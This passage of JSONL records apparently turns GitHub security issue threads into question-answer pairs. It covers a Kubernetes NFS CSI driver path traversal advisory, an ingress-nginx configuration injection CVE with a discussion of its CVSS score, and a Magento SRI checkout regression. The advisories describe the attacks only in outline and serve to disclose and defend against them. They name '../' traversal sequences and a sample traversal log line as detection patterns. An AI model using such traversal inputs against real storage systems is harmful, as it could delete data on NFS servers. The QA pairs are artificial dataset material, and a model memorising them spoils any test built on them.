"2026-06-18T04:32:27.375771Z", "review_note": ""}
{"id": "kubernetes/kubernetes/issue/137797", "repo": "kubernetes/kubernetes", "number": 137797, "title": "CVE-2026-3864: CSI Driver for NFS path traversal via subDir may delete unintended directories on the NFS server", "url": "https://github.com/kubernetes/kubernetes/issues/137797", "state": "closed", "created_at": "2026-03-17T05:54:49Z", "closed_at": "2026-03-18T03:15:41Z", "labels": ["kind/bug", "area/security", "sig/storage", "committee/security-response", "triage/accepted", "official-cve-feed"], "reporter": "ritazh", "security_topic": "path traversal in NFS CSI subDir leading to unintended deletion", "qa_summary": "Whether CVE-2026-3864 in the Kubernetes CSI Driver for NFS lets path traversal in subDir delete unintended directories, with the answer anchored by the fixed version v4.13.1 and the official CVE feed issue.", "question_comment_id": "c0", "answer_comment_id": "c0", "question_author": "ritazh", "answer_author": "ritazh", "answerer_role": "op_self", "artifacts_needed": ["advisory", "documentation"], "hard_facts": {"cve_ids": ["CVE-2026-3864"], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": ["v4.13.1"], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "ritazh", "timestamp": "2026-03-17T05:54:49Z", "body": "**CVSS Rating:**  \n[CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H](https://www.first.org/cvss/calculator/3-1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H) \u2014 **Medium (6.5)**\n\nA vulnerability was discovered in the Kubernetes CSI Driver for NFS where the subDir parameter in volume identifiers was insufficiently validated. Attackers with the ability to create PersistentVolumes referencing the NFS CSI driver could craft volume identifiers containing path traversal sequences (../). During volume deletion or cleanup operations, the driver could operate on unintended directories outside the intended managed path within the NFS export.\n\nThis may lead to deletion or modification of directories on the NFS server.\n\n### Am I vulnerable?\n\nYou may be vulnerable if:\nYou run the CSI Driver for NFS (nfs.csi.k8s.io)\nYour cluster allows users to create PersistentVolumes referencing the NFS CSI driver\nYour CSI driver version does not validate traversal sequences in the subDir field\n\n\n#### Affected Versions\nAll versions of the CSI Driver for NFS prior to the v4.13.1 release containing the fix for traversal validation are affected.\n\n### How do I mitigate this vulnerability?\n\nThis issue can be mitigated by:\nUpgrading the CSI Driver for NFS to a patched version\nRestricting PersistentVolume creation privileges to trusted administrators\nReviewing NFS exports to ensure only intended directories are writable by the driver\n\nAs a best practice, untrusted users should not be granted permission to create arbitrary PersistentVolumes referencing external storage drivers.\n\n\n#### Fixed Versions\n\nCSI Driver for NFS versions >= v4.13.1\n\n### Detection\n\nTo determine if your cluster may be affected:\nInspect PersistentVolumes using the NFS CSI driver and review the volumeHandle field.\nLook for traversal sequences such as: `../`\nReview CSI controller logs for unexpected directory operations. e.g. \u201cRemoving subPath: /tmp/mount-uuid/legitimate/../../../exports/subdir\u201d\n\nIf you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io\n\n#### Acknowledgements\n\nThis vulnerability was reported by Shaul Ben Hai, Senior Staff Security Researcher from SentinelOne.\n\nThe issue was fixed by the CSI Driver for NFS maintainers and the Kubernetes Security Response Committee. \n\nAndy Zhang @andyzhangx\nRita Zhang @ritazh\n\n/area security\n/kind bug\n/committee security-response\n/label official-cve-feed\n", "role": "body"}, {"id": "c1", "author": "jasminekeller751-commits", "timestamp": "2026-03-17T13:39:09Z", "body": "/sig storage\r\n\r\nOn Tue, Mar 17, 2026, 1:02 AM Rita Zhang ***@***.***> wrote:\r\n\r\n> *ritazh* left a comment (kubernetes/kubernetes#137797)\r\n> <https://github.com/kubernetes/kubernetes/issues/137797#issuecomment-4072579437>\r\n>\r\n> /sig storage\r\n>\r\n> \u2014\r\n> Reply to this email directly, view it on GitHub\r\n> <https://github.com/kubernetes/kubernetes/issues/137797#issuecomment-4072579437>,\r\n> or unsubscribe\r\n> <https://github.com/notifications/unsubscribe-auth/B7X2MB7J4IYBF2ADJNUMC7L4RDS6TAVCNFSM6AAAAACWUF7YS2VHI2DSMVQWIX3LMV43OSLTON2WKQ3PNVWWK3TUHM2DANZSGU3TSNBTG4>\r\n> .\r\n> You are receiving this because you are subscribed to this thread.Message\r\n> ID: ***@***.***>\r\n>\r\n", "role": "comment"}], "qa_pairs": [{"qid": "kubernetes/kubernetes/issue/137797#1", "question": "For CVE-2026-3864 in Kubernetes' CSI Driver for NFS (`nfs.csi.k8s.io`), a path traversal issue was reported where the `subDir` parameter in volume identifiers is insufficiently validated. An attacker who can create PersistentVolumes referencing the NFS CSI driver could craft volume identifiers containing `../`, and during volume deletion or cleanup the driver could operate on unintended directories outside the intended managed path within the NFS export, potentially deleting or modifying directories on the NFS server. The CVSS vector is `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H` with Medium severity 6.5. How do I know whether my cluster is vulnerable, how should I mitigate it, what version contains the fix, and how can I detect possible exploitation?", "answer": "You may be vulnerable if you run the CSI Driver for NFS, allow users to create PersistentVolumes referencing it, and are on a driver version that does not validate traversal sequences in the `subDir` field. All CSI Driver for NFS versions before v4.13.1 are affected; versions >= v4.13.1 are fixed. Mitigations are to upgrade to a patched version, restrict PersistentVolume creation privileges to trusted administrators, and ensure NFS exports only allow the driver to write intended directories. For detection, inspect NFS CSI PersistentVolumes' `volumeHandle` for traversal such as `../` and review CSI controller logs for unexpected directory operations such as `Removing subPath: /tmp/mount-uuid/legitimate/../../../exports/subdir`.", "knowledge_type": "grounded", "grounding_sources": ["CVE-2026-3864", "CSI Driver for NFS v4.13.1"], "answer_grounded_in": "c0", "leak_flags": []}], "answer_in_thread_refs": ["https://www.first.org/cvss/calculator/3-1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T04:38:05.141254Z", "review_note": ""}
{"id": "kubernetes/kubernetes/issue/137560", "repo": "kubernetes/kubernetes", "number": 137560, "title": "CVE-2026-3288: ingress-nginx rewrite-target nginx configuration injection", "url": "https://github.com/kubernetes/kubernetes/issues/137560", "state": "closed", "created_at": "2026-03-09T04:29:33Z", "closed_at": "2026-03-11T17:00:20Z", "labels": ["kind/bug", "area/security", "lifecycle/frozen", "committee/security-response", "triage/accepted"], "reporter": "tabbysable", "security_topic": "CVSS scope and required privileges for ingress-target injection vulnerability", "qa_summary": "Whether CVE-2026-3288 in ingress-nginx is a privilege-escalation vulnerability from creating an Ingress and what its CVSS scope/PR should be, anchored by the published CVE record and the severity-ratings.md documentation referenced by the maintainer.", "question_comment_id": "c3", "answer_comment_id": "c4", "question_author": "omelnyk1", "answer_author": "tabbysable", "answerer_role": "maintainer", "artifacts_needed": ["documentation", "cve_cwe_db", "advisory"], "hard_facts": {"cve_ids": ["CVE-2026-3288"], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": ["1.13.8", "1.14.4", "1.15.0"], "fix_prs": [], "fix_commits": [], "advisory_urls": ["https://www.cve.org/cverecord?id=CVE-2026-3288", "https://github.com/kubernetes/kubernetes/issues/137560"]}, "human_note": "", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "tabbysable", "timestamp": "2026-03-09T04:29:33Z", "body": "CVSS Rating: 8.8 (HIGH) [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)\n\nA security issue was discovered in ingress-nginx where the nginx.ingress.kubernetes.io/rewrite-target Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)\n\n### Am I vulnerable?\n\nThis issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running `kubectl get pods --all-namespaces --selector app.kubernetes.io/name=ingress-nginx`.\n\n#### Affected Versions\n\n- ingress-nginx: < 1.13.8\n- ingress-nginx: < 1.14.4\n- ingress-nginx: < 1.15.0\n\n### How do I mitigate this vulnerability?\n\nPrior to upgrading, this vulnerability can be mitigated by using admission control to block the use of the rewrite-target annotation.\n\n#### How to upgrade?\n\nTo upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)\n\n### Detection\n\nSuspicious data within the `rules.http.paths.path` field of an Ingress resource could indicate an attempt to exploit this vulnerability.\n\nIf you find evidence that this vulnerability has been exploited, please contact **security@kubernetes.io**\n\n#### Acknowledgements\n\nThis vulnerability was reported by Kai Aizen\n\n/area security\n/kind bug\n/committee security-response\n/label official-cve-feed\n/sig network\n\n<details>\n<summary>OSV format</summary>\n\n```json osv\n{\n  \"schema_version\": \"1.6.0\",\n  \"id\": \"CVE-2026-3288\",\n  \"modified\": \"2026-03-09T15:45:50Z\",\n  \"summary\": \"ingress-nginx rewrite-target nginx configuration injection\",\n  \"details\": \"A security issue was discovered in ingress-nginx where the nginx.ingress.kubernetes.io/rewrite-target Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)\",\n  \"severity\": [\n    {\n      \"type\": \"CVSS_V3\",\n      \"score\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"\n    }\n  ],\n  \"affected\": [\n    {\n      \"package\": {\n        \"ecosystem\": \"Kubernetes\",\n        \"name\": \"ingress-nginx\"\n      },\n      \"ranges\": [\n        {\n          \"type\": \"SEMVER\",\n          \"events\": [\n            {\n              \"introduced\": \"0\"\n            },\n            {\n              \"fixed\": \"1.13.8\"\n            },\n            {\n              \"introduced\": \"0\"\n            },\n            {\n              \"fixed\": \"1.14.4\"\n            },\n            {\n              \"introduced\": \"0\"\n            },\n            {\n              \"fixed\": \"1.15.0\"\n            }\n          ]\n        }\n      ]\n    }\n  ],\n  \"references\": [\n    {\n      \"type\": \"ADVISORY\",\n      \"url\": \"https://www.cve.org/cverecord?id=CVE-2026-3288\"\n    },\n    {\n      \"type\": \"ADVISORY\",\n      \"url\": \"https://github.com/kubernetes/kubernetes/issues/137560\"\n    },\n    {\n      \"type\": \"WEB\",\n      \"url\": \"https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"\n    }\n  ],\n  \"credits\": [\n    {\n      \"name\": \"This vulnerability was reported by Kai Aizen\",\n      \"type\": \"FINDER\"\n    }\n  ]\n}\n```\n\n</details>\n\n<!-- generated by srctl v1.0.1 (277a81449bef-dirty, 2026-03-02T21:32:55Z, go1.25.6) -->\n\n\n/triage accepted\n/lifecycle frozen\n/area security\n/kind bug\n/committee security-response", "role": "body"}, {"id": "c1", "author": "tabbysable", "timestamp": "2026-03-09T17:35:02Z", "body": "As is our policy, we have published this notification at the time of public disclosure of the fix source code.\n\nRelease builds for ingress-nginx v1.13.8, v1.14.4, and v1.15.0 are currently in progress. I will post back here when they are complete.", "role": "comment"}, {"id": "c2", "author": "tabbysable", "timestamp": "2026-03-09T20:48:58Z", "body": "Builds have completed. v1.13.8, v1.14.4, and v1.15.0 binary artifacts are now available in all the usual places.\n\nThanks a lot, y'all.", "role": "comment"}, {"id": "c3", "author": "omelnyk1", "timestamp": "2026-03-11T16:26:22Z", "body": "Hey guys,\n\nCould you please clarify [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) ? If I understood correctly, to exploit this vulnerability attacker should be authenticated to Kubernetes cluster and have role with permissions to modify ingress objects.\n\nIs it correct? If so, does it mean that attack vector (AV) should be Local and Privileges Required (PR) is High.\n\nThank you in advanced.\n\nCC: @tabbysable \n", "role": "comment"}, {"id": "c4", "author": "tabbysable", "timestamp": "2026-03-11T16:58:59Z", "body": "@omelnyk1 You are correct about the scope and impact of the vuln: it is a privilege escalation from \"user with permission to create an ingress\" to \"probably cluster admin, depending on how the cluster is configured\".\n\nThe difficulty you see is a constant tension with CVSS and software like Kubernetes. CVSS is best aligned with the security needs of desktop software, where there is a clear distinction between an attacker sitting at the keyboard and an attacker who is somewhere else. You will rarely see \"local\" attack vector in Kubernetes CVEs because local means someone who has an account on the server where the Kubernetes component is running--usually a control plane node. In the Kubernetes security model, it is discouraged and exceptionally rare for anyone other than trusted admins to have *any* access to that layer.\n\nSimilarly, in this CVE, \"permissions required\" is evaluated from the point of view of a cluster administrator who operates a cluster for use by engineers who run workloads on the cluster. So in this case, \"none\" would mean for example customers, \"low\" the engineers who run workloads but don't administer the cluster, and \"high\" the cluster administrators themselves. (This is also why you don't see many Kubernetes CVEs with high required privileges: there are not very many things that require cluster admin access and count as security vulnerabilities. Often, if a behavior is only available to cluster administrators, it's considered an ordinary bug or a dangerous feature.)\n\nFor more context on how the Security Response Committee considers these types of questions, see [our documentation on the subject](https://github.com/kubernetes/committee-security-response/blob/main/severity-ratings.md).", "role": "comment"}, {"id": "c5", "author": "tabbysable", "timestamp": "2026-03-11T17:00:14Z", "body": "Closing the issue because we do that once the CVE record has been published. Please feel free to continue to discuss this vulnerability here; \"closed\" does not mean there is nothing more to say, only that the release process is complete.\n\n/close", "role": "comment"}, {"id": "c6", "author": "k8s-ci-robot", "timestamp": "2026-03-11T17:00:21Z", "body": "@tabbysable: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/137560#issuecomment-4040692224):\n\n>Closing the issue because we do that once the CVE record has been published. Please feel free to continue to discuss this vulnerability here; \"closed\" does not mean there is nothing more to say, only that the release process is complete.\n>\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>", "role": "comment"}], "qa_pairs": [{"qid": "kubernetes/kubernetes/issue/137560#1", "question": "For CVE-2026-3288, ingress-nginx rewrite-target nginx configuration injection, the issue lists CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H. If I understand correctly, to exploit this vulnerability an attacker must be authenticated to the Kubernetes cluster and have a role with permissions to modify Ingress objects. Is that correct? If so, should the CVSS Attack Vector (AV) be Local and Privileges Required (PR) be High instead of AV:N and PR:L?", "answer": "Yes, the vulnerability scope/impact is correctly understood as a privilege escalation from a user with permission to create an Ingress to probably cluster admin, depending on cluster configuration. The maintainer explained that Kubernetes CVEs rarely use CVSS Local because Local means access to the server where the Kubernetes component runs, such as a control plane node. Privileges Required is evaluated from the cluster operator perspective: in this case, Low corresponds to engineers/users who can run workloads but do not administer the cluster, while High would mean cluster administrators themselves. For more context, they pointed to the Kubernetes Security Response Committee severity-ratings documentation (https://github.com/kubernetes/committee-security-response/blob/main/severity-ratings.md).", "knowledge_type": "grounded", "grounding_sources": ["https://github.com/kubernetes/committee-security-response/blob/main/severity-ratings.md", "CVE-2026-3288"], "answer_grounded_in": "c4", "leak_flags": []}], "answer_in_thread_refs": ["https://github.com/kubernetes/committee-security-response/blob/main/severity-ratings.md"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T04:44:45.462113Z", "review_note": ""}
{"id": "magento/magento2/issue/40236", "repo": "magento/magento2", "number": 40236, "title": "SRI hashes stop checkout from loading static.js and mixins.js when bundling and minify is enabled", "url": "https://github.com/magento/magento2/issues/40236", "state": "closed", "created_at": "2025-10-16T21:54:28Z", "closed_at": "2026-01-30T08:07:10Z", "labels": ["Issue: On Hold", "Reported on 2.4.8-p3"], "reporter": "marshallthornton", "security_topic": "checkout breakage from SRI hash generation with JS bundling/minification", "qa_summary": "Whether the checkout breakage from missing static.min.js and mixins.min.js under SRI-enabled bundling/minification is a real security-patch regression, with the answer anchored by the Adobe internal Jira AC-15867 and the official quality-patches commit b5333ad787f6946c2ac0452ede276a6f7a7c837d.", "question_comment_id": "c0", "answer_comment_id": "c32", "question_author": "marshallthornton", "answer_author": "hryvinskyi", "answerer_role": "commenter", "artifacts_needed": ["advisory", "documentation", "pr_data", "commit_history"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": ["3df14e684d67bd8f7d278f4340ab133b"], "advisory_urls": ["https://gist.github.com/hryvinskyi/3df14e684d67bd8f7d278f4340ab133b"]}, "human_note": "borderline: deployment pipeline regression affecting checkout rendering, but lacks confirmed security impact or official fix anchor; patch is user-proposed, not validated upstream fix; security framing (SRI regression) is plausible but not substantiated as vulnerability class", "llm_confidence": 0.7124999999999999, "comments": [{"id": "c0", "author": "marshallthornton", "timestamp": "2025-10-16T21:54:28Z", "body": "### Preconditions and environment\n\n- Magento version 2.4.8-p3 \n- CSP module enabled\n\n\n### Steps to reproduce\n\n1. Set store to production mode\n2. Enable bundling and minify options for JS\n3. Deploy the content\n4. Add item to cart and browse to checkout\n5. Check to see if static.min.js and mixins.min.js were loaded onto the page\n\n### Expected result\n\nThe JS files are added to the <head> section and loaded on the page\n\n### Actual result\n\nBoth of these files are missing from the page\n\n### Additional information\n\nIt looks like the changes to Magento/Csp/Model/Deploy/Package/Processor/PostProcessor/Integrity.php in the recent patch to write all the integrity hashes to the file during deployment plus the new GenerateBundleAssetIntegrity.php are causing this. Mostly due to how it adds the files, it does not see the correct `.min.js` filename while writing the file and instead puts it as normal `.js` files.\n\nPreviously, the `sri-hashes.json` file would only contain the `requirejs-config.min.js` file hashes in it and nothing else. This led to the bundle files getting placed in the same group as everything else so the Config block that adds all the JS files in worked without issue since it could find the bundle file to add them after. \n\nNow, with the hashes, it correctly looks up the bundle file hashes because the plugin does a file search after deployment to get their correct names with .min.js in it and add their hashes causing them to be put in separate asset groups. It then fails to lookup the hashes for `static.min.js` and `mixins.min.js` because they are stored as `static.js` and `mixins.js` in the integrity map so it ends up trying to insert them into the existing js asset group but, since the bundle files aren't in there, fails to add them since it can't find the key to put them after.\n\nThe only way to make it work currently is either disable the minifying or bundling of the JS files. \n\n### Release note\n\n_No response_\n\n### Triage and priority\n\n- [ ] Severity: **S0** _- Affects critical data or functionality and leaves users without workaround._\n- [ ] Severity: **S1** _- Affects critical data or functionality and forces users to employ a workaround._\n- [x] Severity: **S2** _- Affects non-critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S3** _- Affects non-critical data or functionality and does not force users to employ a workaround._\n- [ ] Severity: **S4** _- Affects aesthetics, professional look and feel, \u201cquality\u201d or \u201cusability\u201d._", "role": "body"}, {"id": "c1", "author": "m2-assistant", "timestamp": "2025-10-16T21:54:31Z", "body": "Hi @marshallthornton. Thank you for your report. \nTo speed up processing of this issue, make sure that the issue is reproducible on the vanilla Magento instance following **Steps to reproduce**. \n- For more details, review the [Magento Contributor Assistant](https://developer.adobe.com/commerce/contributor/guides/code-contributions/#contributor-assistant) documentation.\n- Add a comment to [assign the issue](https://developer.adobe.com/commerce/contributor/guides/code-ontributions/#assigning-an-issue): `@magento I am working on this` \n- To learn more about issue processing workflow, refer to the [Code Contributions](https://developer.adobe.com/commerce/contributor/guides/code-contributions/).\n---\nJoin [Magento Community Engineering Slack](https://developer.adobe.com/open/magento/slack) and ask your questions in [#github](https://magentocommeng.slack.com/messages/C7KB93M32) channel. \n :warning: According to the Magento Contribution requirements, all issues must go through the Community Contributions Triage process. Community Contributions Triage is a public meeting. \n:clock10: You can find the schedule on the [Magento Community Calendar page](https://www.adobe.io/open/magento/calendar).\n:telephone_receiver: The triage of issues happens in the queue order. If you want to speed up the delivery of your contribution, join the Community Contributions Triage session to discuss the appropriate ticket.", "role": "comment"}, {"id": "c2", "author": "pknap", "timestamp": "2025-10-16T22:06:50Z", "body": "We're facing the same (or very similar) issue after upgrading from 2.4.7-p7 to 2.4.7-p8 - after installing the security patch, all mixins stopped being loaded in the checkout. \n\nHowever, in our case, this happens only in the child theme and only when using the compact strategy for static content deployment, so I'm not entirely sure that this is exactly the same issue, but definitely related to SRI changes introduced in this patch, so thank you @marshallthornton for opening this ticket and confirming I've not gone mad. \n\nThere are plenty of commits in the CSP module:\n\nhttps://github.com/magento/magento2/commit/10da29ef1f0ab9f02179637703da1746f53663c4\n\nwith a commit message like:\n\n> ACP2E-3854: Bundled/Merged JS not part of SRI Hashes\n\nwhich are only part of 2.4.9 branch, so I suspect that possibly the SRI logic included in the latest security patch is incomplete/bugged? ", "role": "comment"}, {"id": "c3", "author": "marshallthornton", "timestamp": "2025-10-16T22:36:44Z", "body": "Possible, I was able to replicate the issue using the Luma theme in testing with just bundle + minify enabled. When I was using XDebug to step through the static content deployment process, I could see the `$file->getDeployedFilePath()` returning the non-minified static.js and mixins.js filenames in Csp's integrity post-processor. So this might be more of a bug with the deploy module not giving the correct actual names of the files it created in the post processing logic and instead giving the base original names.", "role": "comment"}, {"id": "c4", "author": "jtolhurst-relias", "timestamp": "2025-10-17T16:48:05Z", "body": "We are also seeing issues similar issues with mixins not loading in Checkout on `2.4.6-p13` with only JS minify enabled.  Disabling JS minify resolves the issue, but this is not desired.", "role": "comment"}, {"id": "c5", "author": "magenizr", "timestamp": "2025-10-20T06:17:35Z", "body": "Same here on 2.4.6-p13. For us, the path `/var/www/html/codebase/pub/static/frontend/sri-hashes.json` isn\u2019t an appropriate location to write such files.\n\n```\n[2025-10-20T06:16:32.327076+00:00] main.CRITICAL: Magento\\Framework\\Exception\\FileSystemException: The path \"/var/www/html/codebase/pub/static/frontend/sri-hashes.json\" is not writable. in /var/www/html/codebase/vendor/magento/framework/Filesystem/Directory/Write.php:62\n```\n\nApparently it gets created during the build ( Docker container ) and then becomes non-writable on our read-only filesystem. I\u2019ll create a patch and share shortly.", "role": "comment"}, {"id": "c6", "author": "engcom-Bravo", "timestamp": "2025-10-20T07:58:25Z", "body": "Hi @marshallthornton,\n\nThanks for your reporting and collaboration.\n\nInternal Jira has been already created https://jira.corp.adobe.com/browse/AC-15866. Hence we will provide further updates here and we are closing this issue.\n\nThanks.", "role": "comment"}, {"id": "c7", "author": "bigbangx", "timestamp": "2025-10-20T08:18:48Z", "body": "hello @engcom-Bravo \n\ncan you share current state of the investigation ? any ETA ? \n\nDo you think it would be safe to revert all module-csp changes with a patch as a temporary workaround to be able to deploy other fixes ASAP ? ", "role": "comment"}, {"id": "c8", "author": "hostep", "timestamp": "2025-10-20T08:26:56Z", "body": "@engcom-Bravo: please re-open until this is fully fixed, closing this is not the correct action.\n\nAlso you referenced the wrong ticket number, it should be AC-15867, AC-15866 is another bug around _merging_, not around _bundling_ or _minifying_ (at least that's what Nathan said on Slack).", "role": "comment"}, {"id": "c9", "author": "ivanweiler", "timestamp": "2025-10-20T08:56:19Z", "body": "Confirming on 2.4.7-p8, I think severity should be increased on this one because if Checkout Agreements are enabled on checkout (I agree checkboxes), customers can not pass checkout !! because agreements work through mixins.\n\nSecurity releases should not modify functionality this much.", "role": "comment"}, {"id": "c10", "author": "engcom-Bravo", "timestamp": "2025-10-20T09:26:23Z", "body": "@hostep Thanks for your Contribution!!.\n\nWe are reopening this issue we will provide updates here till then moving to On Hold.\n\nThanks.", "role": "comment"}, {"id": "c11", "author": "pusachev-hublo", "timestamp": "2025-10-20T14:02:46Z", "body": "Hi @engcom-Bravo,\n\nDo you have any updates regarding this issue? We recently upgraded to version 2.4.7-p8 and are still encountering a similar error related to mixin.js not loading.\n\nThank you!", "role": "comment"}, {"id": "c12", "author": "bartoszkubicki", "timestamp": "2025-10-21T05:20:31Z", "body": "Hi @engcom-Bravo \n\nwe face SRI related issues as well, but in our case it completely breaks checkout\n\n`{\"0\":\"Unable to unserialize value. Error: Syntax error\",\"1\":\"#1 Magento\\\\Csp\\\\Model\\\\SubresourceIntegrityRepository->getData() called at [vendor\\/magento\\/module-csp\\/Model\\/SubresourceIntegrityRepository.php:86]\\n#2 Magento\\\\Csp\\\\Model\\\\SubresourceIntegrityRepository->getByPath() called at [vendor\\/magento\\/module-csp\\/Plugin\\/AddDefaultPropertiesToGroupPlugin.php:91]\\n#3 Magento\\\\Csp\\\\Plugin\\\\AddDefaultPropertiesToGroupPlugin->beforeGetFilteredProperties() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:121]\\n#4 Magento\\\\Framework\\\\View\\\\Asset\\\\GroupedCollection\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:153]\\n#5 Magento\\\\Framework\\\\View\\\\Asset\\\\GroupedCollection\\\\Interceptor->___callPlugins() called at [generated\\/code\\/Magento\\/Framework\\/View\\/Asset\\/GroupedCollection\\/Interceptor.php:23]\\n#6 Magento\\\\Framework\\\\View\\\\Asset\\\\GroupedCollection\\\\Interceptor->getFilteredProperties() called at [vendor\\/magento\\/framework\\/View\\/Asset\\/GroupedCollection.php:60]\\n#7 Magento\\\\Framework\\\\View\\\\Asset\\\\GroupedCollection->add() called at [vendor\\/magento\\/framework\\/View\\/Page\\/Config.php:498]\\n#8 Magento\\\\Framework\\\\View\\\\Page\\\\Config->addPageAsset() called at [vendor\\/magento\\/framework\\/View\\/Page\\/Config\\/Generator\\/Head.php:132]\\n#9 Magento\\\\Framework\\\\View\\\\Page\\\\Config\\\\Generator\\\\Head->processAssets() called at [vendor\\/magento\\/framework\\/View\\/Page\\/Config\\/Generator\\/Head.php:104]\\n#10 Magento\\\\Framework\\\\View\\\\Page\\\\Config\\\\Generator\\\\Head->process() called at [vendor\\/magento\\/framework\\/View\\/Layout\\/GeneratorPool.php:93]\\n#11 Magento\\\\Framework\\\\View\\\\Layout\\\\GeneratorPool->process() called at [vendor\\/magento\\/framework\\/View\\/Layout.php:365]\\n#12 Magento\\\\Framework\\\\View\\\\Layout->generateElements() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:58]\\n#13 Magento\\\\Framework\\\\View\\\\Layout\\\\Interceptor->___callParent() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:138]\\n#14 Magento\\\\Framework\\\\View\\\\Layout\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:153]\\n#15 Magento\\\\Framework\\\\View\\\\Layout\\\\Interceptor->___callPlugins() called at [generated\\/code\\/Magento\\/Framework\\/View\\/Layout\\/Interceptor.php:32]\\n#16 Magento\\\\Framework\\\\View\\\\Layout\\\\Interceptor->generateElements() called at [vendor\\/magento\\/framework\\/View\\/Layout\\/Builder.php:129]\\n#17 Magento\\\\Framework\\\\View\\\\Layout\\\\Builder->generateLayoutBlocks() called at [vendor\\/magento\\/framework\\/View\\/Page\\/Builder.php:65]\\n#18 Magento\\\\Framework\\\\View\\\\Page\\\\Builder->generateLayoutBlocks() called at [vendor\\/magento\\/framework\\/View\\/Layout\\/Builder.php:65]\\n#19 Magento\\\\Framework\\\\View\\\\Layout\\\\Builder->build() called at [vendor\\/magento\\/framework\\/View\\/Page\\/Config.php:227]\\n#20 Magento\\\\Framework\\\\View\\\\Page\\\\Config->build() called at [vendor\\/magento\\/framework\\/View\\/Page\\/Config.php:250]\\n#21 Magento\\\\Framework\\\\View\\\\Page\\\\Config->getTitle() called at [vendor\\/magento\\/module-checkout\\/Controller\\/Index\\/Index.php:48]\\n#22 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index->execute() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:58]\\n#23 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->___callParent() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:138]\\n#24 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/module-company\\/Plugin\\/Checkout\\/Controller\\/Index\\/IndexPlugin.php:108]\\n#25 Magento\\\\Company\\\\Plugin\\\\Checkout\\\\Controller\\\\Index\\\\IndexPlugin->aroundExecute() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:135]\\n#26 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/module-purchase-order\\/Plugin\\/Checkout\\/Controller\\/Index\\/IndexPlugin.php:116]\\n#27 Magento\\\\PurchaseOrder\\\\Plugin\\\\Checkout\\\\Controller\\\\Index\\\\IndexPlugin->aroundExecute() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:135]\\n#28 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/module-negotiable-quote\\/Plugin\\/Checkout\\/Controller\\/Index\\/IndexPlugin.php:104]\\n#29 Magento\\\\NegotiableQuote\\\\Plugin\\\\Checkout\\\\Controller\\\\Index\\\\IndexPlugin->aroundExecute() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:135]\\n#30 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:153]\\n#31 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->___callPlugins() called at 